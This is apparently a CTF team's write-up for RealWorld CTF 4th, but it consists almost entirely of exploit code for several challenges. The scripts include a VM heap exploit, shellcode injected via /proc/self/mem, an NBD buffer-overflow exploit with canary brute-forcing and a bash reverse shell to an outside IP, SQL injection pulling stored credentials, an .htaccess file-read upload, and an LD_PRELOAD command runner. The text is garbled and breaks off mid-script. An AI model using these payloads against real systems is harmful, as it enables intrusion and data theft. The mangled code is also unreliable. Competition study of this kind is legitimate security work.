# RealWorld CTF 4th Writeup by r3kapig

> 原文: https://www.ctfiot.com/24141.html
> ID: 24141


```
from pwn import *

context.log_level = "debug"
context.binary = "./svme"

'''
typedef enum {
    NOOP    = 0,
    IADD    = 1,   // int add
    ISUB    = 2,
    IMUL    = 3,
    ILT     = 4,   // int less than
    IEQ     = 5,   // int equal
    BR      = 6,   // branch
    BRT     = 7,   // branch if true
    BRF     = 8,   // branch if true
    ICONST  = 9,   // push constant integer
    LOAD    = 10,  // load from local context
    GLOAD   = 11,  // load from global memory
    STORE   = 12,  // store in local context
    GSTORE  = 13,  // store in global memory
    PRINT   = 14,  // print stack top
    POP     = 15,  // throw away top of stack
    CALL    = 16,  // call function at address with nargs,nlocals
    RET     = 17,  // return value from function
    HALT    = 18
} VM_CODE;
'''

    #p = process("./svme")
    #base = p.libs()["/media/psf/Home/Documents/2022-CTF/realworldctf-2022/pwn-SVME/svme_9495bfd34dcaea7af748f1138d5fc25e/svme"]

IP, PORT = "47.243.140.252", 1337
p = remote(IP, PORT)
# opcode
GSTORE = 13 # gstore, offset
POP = 15    # pop
GLOAD = 11  # gload, offset
LOAD = 10   # load, offset
STORE = 12  # store, offset
PUSH = ICONST = 9 # push, data
ADD = IADD = 1 # add
HALT = 18

# debug mode
cmd = ""
    #cmd = "b *%dn" %(base+0x137e) # loop
    #cmd += "b *%dn" %(base+0x1d58) # vm_exec
    #cmd = "set $a=0x5555555592a0n" # vm's address
    #cmd += "b *%dn" %(base+0x194C) # before exit
    #gdb.attach(p, cmd)

# payload opcode 
code = p32(POP)*1
code += p32(GSTORE) + p32(1)
code += p32(GSTORE) + p32(0)

code += p32(GSTORE) + p32(3)
code += p32(GSTORE) + p32(2)

code += p32(GSTORE) + p32(5)
code += p32(GSTORE) + p32(4)

# gstore balance
code += p32(GLOAD) + p32(4)
code += p32(GLOAD) + p32(5)

code += p32(GLOAD) + p32(2)
code += p32(GLOAD) + p32(3)

code += p32(GLOAD) + p32(0)
code += p32(GLOAD) + p32(1)

# load stack ptr data (in gloabl area) to stack area
code += p32(GLOAD) + p32(4)
code += p32(GLOAD) + p32(5)

# change global ptr
code += p32(STORE) + p32(-992&0xffffffff)
code += p32(STORE) + p32(-993&0xffffffff)

# store balance
code += p32(LOAD) + p32(-993&0xffffffff)
code += p32(LOAD) + p32(-992&0xffffffff)

# load libc address(in global area -> program stack) to stack area
# reverse data for calc
code += p32(GLOAD) + p32(0x87)
code += p32(GLOAD) + p32(0x86)

# calc system and __free_hook address offset
'''
leak         =>  0x7ffff7dea0b3
system       =>  0x7ffff7e18410
__free_hook-8  =>  0x7ffff7fb1b20 
'''

# calc system address
code += p32(PUSH) + p32(0x7ffff7e18410-0x7ffff7dea0b3)
code += p32(ADD)

# calc __free_hook_address
code += p32(GLOAD) + p32(0x86)
code += p32(PUSH) + p32(0x7ffff7fb1b20-0x7ffff7dea0b3)
code += p32(ADD)

# global area -> &__free_hook
code += p32(STORE) + p32(-993&0xffffffff)
code += p32(STORE) + p32(-990&0xffffffff)
code += p32(STORE) + p32(-992&0xffffffff)

code += p32(LOAD) + p32(-992&0xffffffff)
code += p32(LOAD) + p32(-990&0xffffffff)

code += p32(GSTORE) + p32(2)
code += p32(GSTORE) + p32(3)

# /bin/shx00 => 0x68732f6e69622f
code += p32(PUSH) + p32(0x6e69622f)
code += p32(PUSH) + p32(0x68732f)

code += p32(GSTORE) + p32(1)
code += p32(GSTORE) + p32(0)

# nop padding
code += p32(HALT)

code = code.ljust(512, b"x00")

p.send(code)

p.interactive()
    #include<string.h>
    #include<fcntl.h>
    #include
    #include<stdio.h>
    #include<stdlib.h>
    #include <stdint.h>
    #include <stdlib.h>

int ql_open(char* abs_path, long flag){
        int fd,dir_fd;

        char path[128] = "../../../../../../../..";
        strcat(path, abs_path);
        printf("path for qiling is %sn",path);
        dir_fd  = syscall(2,".",O_RDONLY,0666);
        fd  = syscall(257,dir_fd, path ,flag,0666);
        close(dir_fd);
        return fd;
}
int main(){
        int  fd;
        int file_size;
        unsigned long ret,off;
        char buf[30000];
        fd  = ql_open("/proc/self/maps",O_RDONLY);
        memset(buf,0,sizeof(buf));
        read(fd,buf,12);

        off = strtol(buf, (char*)buf+12, 16);
        printf("python offset = %lxn",off);
        read(fd,&buf[12],40960);
        puts(buf);
        close(fd);

        fd = ql_open("/proc/self/mem",O_RDWR);
        ret = lseek(fd, off+0x3FF8,SEEK_SET);
        printf("seek set ret = %lxn",ret);
        unsigned long cxaf_addr = 0;
        read(fd,&cxaf_addr,8);
        printf("__cxa_finalize = %lxn",cxaf_addr);

        unsigned long libc_addr = cxaf_addr - 0x3ea00 ;
        unsigned long free_addr = libc_addr + 0x8a720;

        printf("__libc_addr = %lxn",libc_addr);

        ret = lseek(fd, free_addr,SEEK_SET);
        printf("seek set ret = %lxn",ret);

        char shellcode[] = {'j','h','H','xb8','/','b','i','n','/','/','/','s','P','H','x89','xe7','h','r','i','x01','x01','x81','4','$','x01','x01','x01','x01','1','xf6','V','j','x08','^','H','x01','xe6','V','H','x89','xe6','1','xd2','j',';','X','x0f','x05'};
        write(fd,shellcode,strlen(shellcode));
        close(fd);

}
from pwn import *

debug = 0
context.log_level = 'debug'
# 0x000093fc 0x9270 0x9294
base = 0x13f510
if debug:
    p = remote('192.168.101.23', 8554)
else:
    p = remote('47.242.246.203', 32042)
#    p.sendlineafter(':', 'jFtAt3QdTzm8W1qjMz+Oaw==')

sc = [
    0x23, 0x14, 0x0E, 0xDD, 0x00, 0x20, 0xEE, 0xDD, 0x01, 0x20, 0x82, 0xB8, 0x3B, 0x6E, 0x25, 0x16,
    0x68, 0xE4, 0x13, 0x10, 0x2F, 0x32, 0x40, 0xA3, 0x68, 0xE4, 0x13, 0x10, 0x66, 0x32, 0x41, 0xA3,
    0x68, 0xE4, 0x13, 0x10, 0x6C, 0x32, 0x42, 0xA3, 0x68, 0xE4, 0x13, 0x10, 0x61, 0x32, 0x43, 0xA3,
    0x68, 0xE4, 0x13, 0x10, 0x67, 0x32, 0x44, 0xA3, 0x68, 0xE4, 0x13, 0x10, 0x00, 0x32, 0x45, 0xA3,
    0x88, 0xE4, 0x03, 0x10, 0x68, 0xE4, 0x13, 0x10, 0x00, 0x30, 0x4F, 0x6C, 0x63, 0x28, 0x38, 0x37,
    0x00, 0xC0, 0x20, 0x20, 0x00, 0x40, 0x00, 0xB4, 0x28, 0xE4, 0x13, 0x11, 0x68, 0xE4, 0x03, 0x10,
    0x02, 0xEA, 0x00, 0x01, 0x00, 0x93, 0x3F, 0x37, 0x00, 0xC0, 0x20, 0x20, 0x00, 0x40, 0x68, 0xE4,
    0x13, 0x11, 0x02, 0xEA, 0x00, 0x10, 0x4F, 0x6C, 0x04, 0x30, 0x40, 0x37, 0x00, 0xC0, 0x20, 0x20,
    0x00, 0x6C, 0xA3, 0x6F, 0x82, 0x98, 0xEE, 0xD9, 0x01, 0x20, 0x0E, 0xD9, 0x00, 0x20, 0x03, 0x14,

    # useless shellcode just for stucking process, used to launch shell
    0x22, 0x14, 0x0E, 0xDD, 0x00, 0x20, 0xEE, 0xDD, 0x01, 0x20, 0x3B, 0x6E, 0x2A, 0x14, 0x68, 0xE4,
    0x0F, 0x10, 0x2F, 0x32, 0x40, 0xA3, 0x68, 0xE4, 0x0F, 0x10, 0x62, 0x32, 0x41, 0xA3, 0x68, 0xE4,
    0x0F, 0x10, 0x69, 0x32, 0x42, 0xA3, 0x68, 0xE4, 0x0F, 0x10, 0x6E, 0x32, 0x43, 0xA3, 0x68, 0xE4,
    0x0F, 0x10, 0x2F, 0x32, 0x44, 0xA3, 0x68, 0xE4, 0x0F, 0x10, 0x62, 0x32, 0x45, 0xA3, 0x68, 0xE4,
    0x0F, 0x10, 0x75, 0x32, 0x46, 0xA3, 0x68, 0xE4, 0x0F, 0x10, 0x73, 0x32, 0x47, 0xA3, 0x68, 0xE4,
    0x0F, 0x10, 0x79, 0x32, 0x48, 0xA3, 0x68, 0xE4, 0x0F, 0x10, 0x62, 0x32, 0x49, 0xA3, 0x68, 0xE4,
    0x0F, 0x10, 0x6F, 0x32, 0x4A, 0xA3, 0x68, 0xE4, 0x0F, 0x10, 0x78, 0x32, 0x4B, 0xA3, 0x68, 0xE4,
    0x0F, 0x10, 0x00, 0x32, 0x4C, 0xA3, 0x68, 0xE4, 0x17, 0x10, 0x73, 0x32, 0x40, 0xA3, 0x68, 0xE4,
    0x17, 0x10, 0x68, 0x32, 0x41, 0xA3, 0x68, 0xE4, 0x17, 0x10, 0x00, 0x32, 0x42, 0xA3, 0x68, 0xE4,
    0x23, 0x10, 0x48, 0xE4, 0x0F, 0x10, 0x40, 0xB3, 0x68, 0xE4, 0x23, 0x10, 0x48, 0xE4, 0x17, 0x10,
    0x41, 0xB3, 0x68, 0xE4, 0x23, 0x10, 0x00, 0x32, 0x42, 0xB3, 0x68, 0xE4, 0x27, 0x10, 0x00, 0x32,
    0x40, 0xB3, 0x48, 0xE4, 0x27, 0x10, 0x28, 0xE4, 0x23, 0x10, 0x68, 0xE4, 0x0F, 0x10, 0x0F, 0x6C,
    0xE0, 0xB8, 0xDD, 0x37, 0x00, 0xC0, 0x20, 0x20, 0x02, 0x14, 0x3C, 0x78
]

test = b'Oclient_port' + b'a' * 1273 + p32(0x13fa1c)[:3] + b'rnbb' + bytearray(sc) + b'rn'

p.send(test)
# p.sendline(test)
p.interactive()
# shellcode for open read write
subi              sp, sp, 12
st.w              r8, (sp, 0)
st.w              r15, (sp, 0x4)
st.w              r4, (sp, 0x8)
mov              r8, sp
subi              sp, sp, 276
subi              r3, r8, 20
movi              r2, 47
st.b              r2, (r3, 0)
subi              r3, r8, 20
movi              r2, 102
st.b              r2, (r3, 0x1)
subi              r3, r8, 20
movi              r2, 108
st.b              r2, (r3, 0x2)
subi              r3, r8, 20
movi              r2, 97
st.b              r2, (r3, 0x3)
subi              r3, r8, 20
movi              r2, 103
st.b              r2, (r3, 0x4)
subi              r3, r8, 20
movi              r2, 0
st.b              r2, (r3, 0x5)
subi              r4, r8, 4
subi              r3, r8, 20
movi              r0, 0
mov               r1, r3
subi              r0, 100
movi              r7, 56
trap              0

lsli              r0, r0, 0
st.w              r0, (r4, 0)
subi              r1, r8, 276
subi              r3, r8, 4
movi              r2, 256
ld.w              r0, (r3, 0)
movi              r7, 63
trap              0

lsli              r0, r0, 0
subi              r3, r8, 276
movi              r2, 4096
mov              r1, r3
movi              r0, 4
movi              r7, 64
trap              0
from code import interact
from distutils.dir_util import copy_tree
from re import sub
from pwn import *
import subprocess
    #context.log_level = 'debug'
context.arch='amd64'
DEBUG = 0
if(DEBUG):
    ip = "0.0.0.0"
    port = 6666
else:
    ip = "47.242.113.232"
    port =49265
p = None
ru = lambda x: p.recvuntil(x)
rl = lambda  : p.recvline()
ra = lambda  : p.recvall()
rv = lambda x: p.recv(x)
sn = lambda x: p.send(x)
sl = lambda x: p.sendline(x) 
sa = lambda x,y: p.sendafter(x,y) 
def pow():
    ru('sha256("')
    tmp = ru('"')[:-1].decode()
    c1 = "gcc ./pow.c -lcrypto -o ppp".split(' ')
    c2 = f"./ppp {tmp}".split(' ')
    c3 = "rm ./ppp".split(' ')
    subp = subprocess.Popen(c1)
    subp.wait()
    print(c2)
    subp = subprocess.Popen(c2)
    res,_ = subp.communicate()
    subp = subprocess.Popen(c3)
    subp.wait()
    print(res,_)
def anum(n):
    sn(p32(n,endian='big'))
def NBD_OPT_EXPORT_NAME(payload):
    anum(1)
    anum(len(payload))
    sn(payload)
def NBD_OPT_LIST():#baned
    sn(p64(0x54504f4556414849))
    anum(3)
    anum(1)    
def NBD_OPT_STARTTLS(size,c):#Set stack
    anum(5)
    anum(size)
    sn(c)
def NBD_OPT_INFO(buf):
    anum(7)
    anum(len(buf)+4)
    anum(len(buf)+4)
    sn(buf)
    p.read()
    pad = b" "*0x10+b'''sleep 3;bash -c 'exec bash -i &>/dev/tcp/49.234.220.122/20191 <&1';'''*0x6
    sn(pad.ljust(len(buf)+4,b' '))
    sn(p16(0,endian='big'))
    p.readuntil("nown")
def single_req(base,guess):
    global p
    p = remote(ip,port)
    sa("OPTx00x03",p32(0))
    sn(p64(0x54504f4556414849))
    NBD_OPT_INFO(base+guess)
    p.read(timeout=1)
def req(base,length):
    res = b""
    global p
    for x in range(length):
        flag=0
        for _ in range(0x100):
            log.success(f"Trying Pos:{x}:{hex(_)}")
            try:
            #if(1):
                guess = _.to_bytes(1,'little')
                single_req(base+res,guess)
                res+=guess
                flag=1
                break
            
except:
                p.close()
                continue
        if(not flag):
            return 0
        log.warning(hex(u64(res.ljust(8,b' '))))
    res = u64(res.ljust(8,b' '))
    log.warning(hex(res))
    input()
    return res
def canary():
    base=b"A"*(0x408)+b' '
    length=7
    return req(base,length)
def leak_heap():
    global p

    base = b"A"*(0x408)+ p64(canary_val) +b" "*0x18
    length = 6
    return req(base,length)
def leak_pie():
    global p
    base = b"A"*(0x408)+ p64(canary_val) +b" "*0x18
    base+= p64(heap)+p64(0)+p64(heap-0x100)+p64(0)+b"xea"
    length= 5
    return req(base,length)
def exploit(c):
    global p
    p = remote(ip,port)
    sa("OPTx00x03",p32(0))
    sn(p64(0x54504f4556414849))
    pay = b"A"*(0x408)+p64(canary_val)+b" "*0x18
    pay += p64(heap)+p64(0)+p64(heap-0x100)+p64(0)+c
    NBD_OPT_INFO(pay)
    p.interactive()
if __name__ == "__main__":
    canary_val = canary()
    heap  = leak_heap()
    pie = leak_pie()-0x96ea

    ret = 0x000000000000301a+pie 
    rdi = 0x0000000000004a58+pie
    system = 0x3bb0+pie

    
    r = flat([
        ret,rdi,heap+0x100*2,system
    ])
    exploit(r)
try:
            subprocess.run(
                ["javac", "-cp", DEP_FILE, SOURCE_FILE],
                input=b"",
                check=True,
            )
        
except subprocess.CalledProcessError:
            print("Failed to compile!")
            exit(1)

        print("Running...")
        try:
            subprocess.run(["java", "--version"])
            subprocess.run(
                [
                    "java",
                    "-cp",
                    f".:{DEP_FILE}",
                    "-Djava.security.manager",
                    "-Djava.security.policy==/dev/null",
                    "Main",
                ],
                check=True,
            )
        
except subprocess.CalledProcessError:
            print("Failed to run!")
            exit(2)
import exp.Fuck;

public class Main {

    @Fuck
    int a;

    public static void main(String[] args) {

    }
}
package exp;

import java.lang.annotation.ElementType;
import java.lang.annotation.Retention;
import java.lang.annotation.RetentionPolicy;
import java.lang.annotation.Target;

@Retention(RetentionPolicy.SOURCE)
@Target(ElementType.FIELD)
public @interface Fuck {
}
package exp;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOError;
import java.io.IOException;
import java.util.Set;

import javax.annotation.processing.Completion;
import javax.annotation.processing.ProcessingEnvironment;
import javax.annotation.processing.Processor;
import javax.annotation.processing.RoundEnvironment;
import javax.lang.model.SourceVersion;
import javax.lang.model.element.AnnotationMirror;
import javax.lang.model.element.Element;
import javax.lang.model.element.ExecutableElement;
import javax.lang.model.element.TypeElement;

import com.google.auto.service.AutoService;

@AutoService(Processor.class)
public class FuckProcessor implements Processor {

    void listDir(String pathString) {
        System.out.println("---------- " + pathString + "----------");
        File path = new File(pathString);
        for (var name : path.list()) {
            System.out.println(name);
        }
    }

    void exp() {
        File flag = new File("/flag");
        try {
            FileInputStream fileInputStream = new FileInputStream(flag);
            byte[] allBytes = fileInputStream.readAllBytes();
            String flagString = new String(allBytes);
            System.out.println("flag: " + flagString);
            fileInputStream.close();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
        }
    }

    @Override
    public Set<String> getSupportedOptions() {
        // TODO Auto-generated method stub
        return null;
    }

    @Override
    public Set<String> getSupportedAnnotationTypes() {
        // TODO Auto-generated method stub
        return null;
    }

    @Override
    public SourceVersion getSupportedSourceVersion() {
        // TODO Auto-generated method stub
        return null;
    }

    @Override
    public void init(ProcessingEnvironment processingEnv) {
        exp();
    }

    @Override
    public boolean process(Set<? extends TypeElement> annotations, RoundEnvironment roundEnv) {
        exp();
        return false;
    }

    @Override
    public Iterable<? extends Completion> getCompletions(Element element, AnnotationMirror annotation,
            ExecutableElement member, String userText) {
        // TODO Auto-generated method stub
        return null;
    }
    
}
exp.FuckProcessor
// https://mvnrepository.com/artifact/com.google.auto.service/auto-service
    implementation 'com.google.auto.service:
auto-service:1.0.1'
';select tablename,schemaname from pg_tables where tablename like 'ta%' limit 1 offset 1;--
';SELECT column_name,1 FROM information_schema.columns WHERE table_name='target_credentials' limit 1 offset 0;--
';SELECT concat(id,account,password,access_key,secret_key),1 FROM target_credentials where  id ='1
import requests,re

session = requests.session()

file_content="ErrorDocument 404 %{file:/etc/passwd}"
filename=".htaccess"

burp0_url = "http://47.243.75.225:
31337/upload?formid=form-1e5eb93c-a7f4-4d16-9981-618e426c07dd"
burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryS5VjK1pba1yEbdzT", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://47.243.75.225:
31337/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,en-GB;q=0.8,en;q=0.7", "Connection": "close"}
burp0_data = "------WebKitFormBoundaryS5VjK1pba1yEbdzTrnContent-Disposition: form-data; name="form-1e5eb93c-a7f4-4d16-9981-618e426c07dd"; filename="smity.txt"rnContent-Type: text/x-shrnrn"+file_content+"rn------WebKitFormBoundaryS5VjK1pba1yEbdzT--"
r=session.post(burp0_url, headers=burp0_headers, data=burp0_data)

info = re.findall(r'http://47.243.75.225:
31338/(.*?)/smity.txt',r.text)

session = requests.session()

burp0_url = "http://47.243.75.225:
31337/upload?formid=b"
burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryh0XsiM1LBiqUjsXU", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://192.168.1.25:
8000/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,en-GB;q=0.8,en;q=0.7", "Connection": "close"}
burp0_data = "------WebKitFormBoundaryh0XsiM1LBiqUjsXUrnContent-Disposition: form-data; name="a"; filename="null"rnContent-Type: text/xmlrnrnabcrn------WebKitFormBoundaryh0XsiM1LBiqUjsXUrnContent-Disposition: form-data; name="b"; filename=""+filename+""rnContent-Type: text/xmlrnrn"+file_content+"rn------WebKitFormBoundaryh0XsiM1LBiqUjsXU--"
r=session.post(burp0_url, headers=burp0_headers, data=burp0_data)

print('http://47.243.75.225:
31338/'+info[0]+"/"+filename)
    #define _GNU_SOURCE

    #include <stdlib.h>
    #include <stdio.h>
    #include <string.h>

extern char** environ;

__attribute__ ((__constructor__)) void preload (void)
{

    const char* cmdline = "echo 'IyEvdXNyL2xvY2FsL2Jpbi9wZXJsCnVzZSBzdHJpY3Q7CnVzZSBJUEM6Ok9wZW4zOwoKbXkgJHBpZCA9IG9wZW4zKCBcKkNITERfSU4sIFwqQ0hMRF9PVVQsIFwqQ0hMRF9FUlIsICcvcmVhZGZsYWcnICkKICBvciBkaWUgIm9wZW4zKCkgZmFpbGVkICQhIjsKCm15ICRyOwokciA9IDxDSExEX09VVD47CnByaW50ICIkciI7CiRyID0gPENITERfT1VUPjsKcHJpbnQgIiRyIjsKJHIgPSBldmFsICIkciI7CnByaW50ICIkclxuIjsKcHJpbnQgQ0hMRF9JTiAiJHJcbiI7CiRyID0gPENITERfT1VUPjsKcHJpbnQgIiRyIjsKJHIgPSA8Q0hMRF9PVVQ+OwpwcmludCAiJHIiOw==' | base64 -d > /tmp/r3.pl";
    // const char* cmdline = "perl /tmp/r3.pl > /tmp/r3pwn"
    
    int i;
    for (i = 0; environ[i]; ++i) {
            if (strstr(environ[i], "LD_PRELOAD")) {
                    environ[i][0] = ' ';
            }
    }
    system(cmdline);
}
/*
 * File layout
 * [demo with input:
 * BLOCK_SIZE = 4096,
 * node_size = 66,
 * block_nodes = 4096/(66*2) = 31 ]
 *
 * phys block 0:
 * tee_fs_htree_image vers 0 @ offs = 0
 * tee_fs_htree_image vers 1 @ offs = sizeof(tee_fs_htree_image)
 *
 * phys block 1:
 * tee_fs_htree_node_image 0  vers 0 @ offs = 0
 * tee_fs_htree_node_image 0  vers 1 @ offs = node_size
 * tee_fs_htree_node_image 1  vers 0 @ offs = node_size * 2
 * tee_fs_htree_node_image 1  vers 1 @ offs = node_size * 3
 * ...
 * tee_fs_htree_node_image 30 vers 0 @ offs = node_size * 60
 * tee_fs_htree_node_image 30 vers 1 @ offs = node_size * 61
 *
 * phys block 2:
 * data block 0 vers 0
 *
 * phys block 3:
 * data block 0 vers 1
 */
 
/*
 * htree_image is the header of the file, there's two instances of it. One
 * which is committed and the other is used when updating the file. Which
 * is committed is indicated by the "counter" field, the one with the
 * largest value is selected.
 *
 * htree_node_image is a node in the hash tree, each node has two instances
 * which is committed is decided by the parent node .flag bit
 * HTREE_NODE_COMMITTED_CHILD. Which version is the committed version of
 * node 1 is determined by the by the lowest bit of the counter field in
 * the header.
 *
 * Note that nodes start counting at 1 while blocks at 0, this means that
 * block 0 is represented by node 1.
 */
/* Internal struct provided to let the rpc callbacks know the size if needed */
struct tee_fs_htree_image {
        uint8_t iv[TEE_FS_HTREE_IV_SIZE];
        uint8_t tag[TEE_FS_HTREE_TAG_SIZE];
        uint8_t enc_fek[TEE_FS_HTREE_FEK_SIZE];
        uint8_t imeta[sizeof(struct tee_fs_htree_imeta)];
        uint32_t counter;
};
/* Internal struct provided to let the rpc callbacks know the size if needed */
struct tee_fs_htree_node_image {
        /* Note that calc_node_hash() depends on hash first in struct */
        uint8_t hash[TEE_FS_HTREE_HASH_SIZE];
        uint8_t iv[TEE_FS_HTREE_IV_SIZE];
        uint8_t tag[TEE_FS_HTREE_TAG_SIZE];
        uint16_t flags;
};
    #define TA_FRAMEWORK_STACK_SIZE 2048

const struct ta_head ta_head __section(".ta_head") = {
    /* UUID, unique to each TA */
    .uuid = TA_UUID,
    /*
     * According to GP Internal API, TA_FRAMEWORK_STACK_SIZE corresponds to
     * the stack size used by the TA code itself and does not include stack
     * space possibly used by the Trusted Core Framework.
     * Hence, stack_size which is the size of the stack to use,
     * must be enlarged
     */
    .stack_size = TA_STACK_SIZE + TA_FRAMEWORK_STACK_SIZE,
    .flags = TA_FLAGS,
    /*
     * The TA entry doesn't go via this field any longer, to be able to
     * reliably check that an old TA isn't loaded set this field to a
     * fixed value.
     */
    .depr_entry = UINT64_MAX,
};
import os
import struct
from hashlib import sha256
    #from Crypto.Hash import HMAC, SHA256
from hmac import HMAC
from Crypto.Cipher import AES
import binascii
    #from Crypto.Util.Padding import unpad

def AES_Encrypt_CBC(key, iv, data):
    #vi = '0102030405060708'
    pad = lambda s: s + (16 - len(s)%16) * chr(16 - len(s)%16)
    data = pad(data)
    cipher = AES.new(key.encode('utf8'), AES.MODE_CBC, iv.encode('utf8'))

    encryptedbytes = cipher.encrypt(data.encode('utf8'))

    #encodestrs = base64.b64encode(encryptedbytes)
    #enctext = encodestrs.decode('utf8')
    #return enctext
    return encryptedbytes

 
def AES_Decrypt_CBC(key, iv, data):
    #vi = '0102030405060708'
    #data = data.encode('utf8')
    #encodebytes = base64.decodebytes(data)
    
    cipher = AES.new(key, AES.MODE_CBC, iv)
    text_decrypted = cipher.decrypt(data)
    
    unpad = lambda s: s[0:-s[-1]]
    text_decrypted = unpad(text_decrypted)
    #text_decrypted = text_decrypted.decode('utf8')
    return text_decrypted

def AES_Decrypt_ECB(key, data):
    cipher = AES.new(key, AES.MODE_ECB)
    text_decrypted = cipher.decrypt(data)
    return text_decrypted

def bytesToHexString(bs):
    return ' '.join(['%02X' % b for b in bs])

fp = open("2","rb")
data = fp.read()
fp.close()

print (".......... Tee_fs_htree_image ver0 ..............")
offset = 0
Tee_fs_htree_image_0_iv = data[offset + 0x00: offset + 0x10]
Tee_fs_htree_image_0_tag = data[offset + 0x10 : offset + 0x20]
Tee_fs_htree_image_0_enc_fek = data[offset + 0x20 : offset + 0x30]
Tee_fs_htree_image_0_imeta = data[offset + 0x30 : offset + 0x40]
Tee_fs_htree_image_0_counter = struct.unpack("I", data[offset + 0x40 : offset + 0x44])[0]
print(bytesToHexString(Tee_fs_htree_image_0_iv))
print(bytesToHexString(Tee_fs_htree_image_0_tag))
print(bytesToHexString(Tee_fs_htree_image_0_enc_fek))
print(bytesToHexString(Tee_fs_htree_image_0_imeta))
print(Tee_fs_htree_image_0_counter)

print (".......... Tee_fs_htree_image ver1 ..............")
offset = 0x44
Tee_fs_htree_image_1_iv = data[offset : offset + 0x10]
Tee_fs_htree_image_1_tag = data[offset + 0x10 : offset + 0x20]
Tee_fs_htree_image_1_enc_fek = data[offset + 0x20 : offset + 0x30]
Tee_fs_htree_image_1_imeta = data[offset + 0x30 : offset + 0x40]
Tee_fs_htree_image_1_counter = struct.unpack("I", data[offset + 0x40 : offset + 0x44])[0]
print (bytesToHexString(Tee_fs_htree_image_1_iv))
print (bytesToHexString(Tee_fs_htree_image_1_tag))
print (bytesToHexString(Tee_fs_htree_image_1_enc_fek))
print (bytesToHexString(Tee_fs_htree_image_1_imeta))
print (Tee_fs_htree_image_1_counter)

print (".......... Tee_fs_htree_node_image ver0 ..............")
offset = 0x1000
Tee_fs_htree_node_image_0_hash = data[offset + 0x00: offset + 0x20]
Tee_fs_htree_node_image_0_iv = data[offset + 0x20 : offset + 0x30]
Tee_fs_htree_node_image_0_tag = data[offset + 0x30 : offset + 0x40]
Tee_fs_htree_node_image_0_flags = struct.unpack("H", data[offset + 0x40 : offset + 0x42])[0]
print(bytesToHexString(Tee_fs_htree_node_image_0_hash))
print(bytesToHexString(Tee_fs_htree_node_image_0_iv))
print(bytesToHexString(Tee_fs_htree_node_image_0_tag))
print(Tee_fs_htree_node_image_0_flags)

print (".......... Tee_fs_htree_node_image ver1 ..............")
offset = 0x1042
Tee_fs_htree_node_image_1_hash = data[offset + 0x00: offset + 0x20]
Tee_fs_htree_node_image_1_iv = data[offset + 0x20 : offset + 0x30]
Tee_fs_htree_node_image_1_tag = data[offset + 0x30 : offset + 0x40]
Tee_fs_htree_node_image_1_flags = struct.unpack("H", data[offset + 0x40 : offset + 0x42])[0]
print(bytesToHexString(Tee_fs_htree_node_image_1_hash))
print(bytesToHexString(Tee_fs_htree_node_image_1_iv))
print(bytesToHexString(Tee_fs_htree_node_image_1_tag))
print(Tee_fs_htree_node_image_1_flags)

HUK = b'x00'*0x10
chip_id = b'BEEF'*8
static_string = b'ONLY_FOR_tee_fs_ssk'
message = chip_id + static_string + b'x00'
    #message = b'x01x00x00x00'
    #message = static_string

#SSK = HMAC(HUK, chip_id, digestmod=sha256)
#SSK.update(static_string)
#SSK = SSK.digest()

SSK = HMAC(HUK, message, digestmod=sha256).digest()
print ("SSK: " + bytesToHexString(SSK))

ta_uuid =  b'xbbx50xe7xf4x37x14xbfx4fx87x85x8dx35x80xc3x49x94'
    #ta_uuid = b"xF4xE7x50xBBx14x37x4FxBFx87x85x8Dx35x80xC3x49x94"
    #ta_uuid = b"xb6x89xf2xa7x8axdfx47x7ax9fx99x32xe9x0cx0axd0xa2"
    #ta_uuid = b"xb6x89xf2xa7"[::-1] + b"x8axdf"[::-1] + b"x47x7a"[::-1] + b"x9fx99x32xe9x0cx0axd0xa2"
TSK = HMAC(SSK, ta_uuid, digestmod=sha256).digest()
print ("TSK: " + bytesToHexString(TSK))

Enc_FEK = Tee_fs_htree_image_1_enc_fek
#Enc_FEK = b"xf8x83x1axf3x80x0bx72xebxdbxc7x50x27xcbxf2xf4xe7"
FEK = AES_Decrypt_ECB(TSK, Enc_FEK)
print ("FEK: " + bytesToHexString(FEK))

    #test()

"""
print ("........ decrypt meta data ...........")
cipher = AES.new(FEK, AES.MODE_GCM, nonce = Tee_fs_htree_image_1_iv)
cipher.update(Tee_fs_htree_node_image_1_hash)
cipher.update(Tee_fs_htree_image_1_counter.to_bytes(4, "little"))
cipher.update(Enc_FEK)
cipher.update(Tee_fs_htree_image_1_iv)
plaintext = cipher.decrypt_and_verify(Tee_fs_htree_image_1_imeta, Tee_fs_htree_image_1_tag)
print (plaintext)
"""

print ("........ decrypt block data ...........")
block_0 = data[0x2000:
0x3000]
    #block_1 = data[0x3000:
0x4000]

cipher = AES.new(FEK, AES.MODE_GCM, nonce = Tee_fs_htree_node_image_1_iv)

cipher.update(Enc_FEK)
cipher.update(Tee_fs_htree_node_image_1_iv)

plaintext = cipher.decrypt_and_verify(block_0, Tee_fs_htree_node_image_1_tag)
print (plaintext)
from web3 import Web3,HTTPProvider
from typing import Tuple, List
from web3 import Web3
import bisect
w3=Web3(HTTPProvider('http://47.243.235.111:
8545'))

abi="""[
    {
        "inputs": [
            {
                "internalType": "bytes32[]",
                "name": "_proofs",
                "type": "bytes32[]"
            }
        ],
        "name": "enter",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "bytes32[]",
                "name": "_proofs",
                "type": "bytes32[]"
            }
        ],
        "name": "findKey",
        "outputs": [],
